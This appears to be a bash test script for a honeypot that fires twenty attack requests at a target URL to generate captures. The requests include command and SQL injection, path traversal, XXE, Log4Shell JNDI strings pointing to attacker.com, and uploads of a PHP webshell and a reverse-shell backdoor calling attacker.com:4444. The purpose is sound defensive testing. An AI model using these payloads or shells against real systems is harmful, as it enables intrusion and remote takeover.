#!/bin/bash

# Test script to demonstrate payload capture capabilities
# Run this against your honeypot to generate test captures

HONEYPOT_URL="${1:-http://localhost:8080}"

echo "================================"
echo "Breadcrumb-Pot Attack Test Suite"
echo "================================"
echo "Target: $HONEYPOT_URL"
echo ""

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_count=0
success_count=0

run_test() {
    local test_name=$1
    local command=$2

    test_count=$((test_count + 1))
    echo -e "${YELLOW}[TEST $test_count]${NC} $test_name"
    echo "  Command: $command"

    output=$(eval $command 2>&1)
    status=$?

    if [ $status -eq 0 ]; then
        echo -e "  ${GREEN}✓ Request sent${NC}"
        success_count=$((success_count + 1))
    else
        echo -e "  ${RED}✗ Request failed${NC}"
    fi
    echo ""
    sleep 0.5
}

echo "Starting tests..."
echo ""

# Test 1: Admin panel access
run_test "Admin Panel Access" \
    "curl -s -o /dev/null -w '%{http_code}' $HONEYPOT_URL/admin"

# Test 2: PHPInfo exposure
run_test "PHPInfo Page Access" \
    "curl -s -o /dev/null -w '%{http_code}' $HONEYPOT_URL/phpinfo.php"

# Test 3: Path traversal
run_test "Path Traversal Attempt" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/../../etc/passwd'"

# Test 4: .env file access
run_test "Environment File Access" \
    "curl -s -o /dev/null -w '%{http_code}' $HONEYPOT_URL/.env"

# Test 5: Command injection (whoami)
run_test "Command Injection: whoami" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/api?cmd=whoami'"

# Test 6: Command injection (id)
run_test "Command Injection: id" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/api?cmd=id'"

# Test 7: Command injection (uname)
run_test "Command Injection: uname -a" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/api?cmd=uname%20-a'"

# Test 8: Command injection (ls)
run_test "Command Injection: ls" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/search?q=test;ls'"

# Test 9: Command injection (cat)
run_test "Command Injection: cat" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/file?name=config|cat%20/etc/passwd'"

# Test 10: SQL injection (UNION)
run_test "SQL Injection: UNION SELECT" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/user?id=1%20UNION%20SELECT%20*%20FROM%20users'"

# Test 11: SQL injection (OR)
run_test "SQL Injection: OR 1=1" \
    "curl -s -o /dev/null -w '%{http_code}' \"$HONEYPOT_URL/login?username=admin'%20OR%20'1'='1\""

# Test 12: SQL injection (sleep)
run_test "SQL Injection: TIME-BASED" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/api?id=1;SELECT%20SLEEP(5)'"

# Test 13: Log4Shell (JNDI LDAP)
run_test "Log4Shell: JNDI LDAP" \
    "curl -s -o /dev/null -w '%{http_code}' -H 'User-Agent: \${jndi:ldap://attacker.com/a}' $HONEYPOT_URL/"

# Test 14: Log4Shell (JNDI RMI)
run_test "Log4Shell: JNDI RMI" \
    "curl -s -o /dev/null -w '%{http_code}' -H 'X-Api-Version: \${jndi:rmi://attacker.com/evil}' $HONEYPOT_URL/api"

# Test 15: Template injection
run_test "Template Injection: Jinja2" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/page?name={{7*7}}'"

# Test 16: Template injection (EL)
run_test "Template Injection: Expression Language" \
    "curl -s -o /dev/null -w '%{http_code}' '$HONEYPOT_URL/view?template=\#{7*7}'"

# Test 17: XXE attack
run_test "XXE Attack" \
    "curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' $HONEYPOT_URL/api"

# Test 18: PHP webshell upload
echo -e "${YELLOW}[TEST $((test_count + 1))]${NC} Webshell Upload: PHP Shell"
echo "  Creating test webshell..."

cat > /tmp/test_shell.php << 'EOF'
<?php
// Test webshell for honeypot
if(isset($_POST['cmd'])){
    system($_POST['cmd']);
}
eval(base64_decode($_POST['data']));
?>
EOF

run_test "File Upload: PHP Webshell" \
    "curl -s -o /dev/null -w '%{http_code}' -F 'file=@/tmp/test_shell.php' $HONEYPOT_URL/upload.php"

# Test 19: Backdoor upload
echo -e "${YELLOW}[TEST $((test_count + 1))]${NC} Backdoor Upload"
echo "  Creating test backdoor..."

cat > /tmp/backdoor.php << 'EOF'
<?php
$sock=fsockopen("attacker.com",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
EOF

run_test "File Upload: Reverse Shell" \
    "curl -s -o /dev/null -w '%{http_code}' -F 'upload=@/tmp/backdoor.php' $HONEYPOT_URL/upload"

# Test 20: Serialization attack (PHP)
run_test "PHP Serialization Attack" \
    "curl -s -o /dev/null -w '%{http_code}' -X POST -d 'data=O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"evil\";}' $HONEYPOT_URL/api"

# Cleanup
rm -f /tmp/test_shell.php /tmp/backdoor.php

echo "================================"
echo "Test Summary"
echo "================================"
echo -e "Total tests: $test_count"
echo -e "${GREEN}Successful: $success_count${NC}"
echo -e "${RED}Failed: $((test_count - success_count))${NC}"
echo ""
echo "Check your honeypot for captured payloads:"
echo "  ls -lah captures/"
echo "  cat captures/commands/*.txt"
echo "  cat captures/webshells/*.analysis"
echo "  tail -f logs/honeypot_interactions.jsonl | jq"
echo ""
echo "View statistics:"
echo "  curl $HONEYPOT_URL/_stats | jq"
echo ""
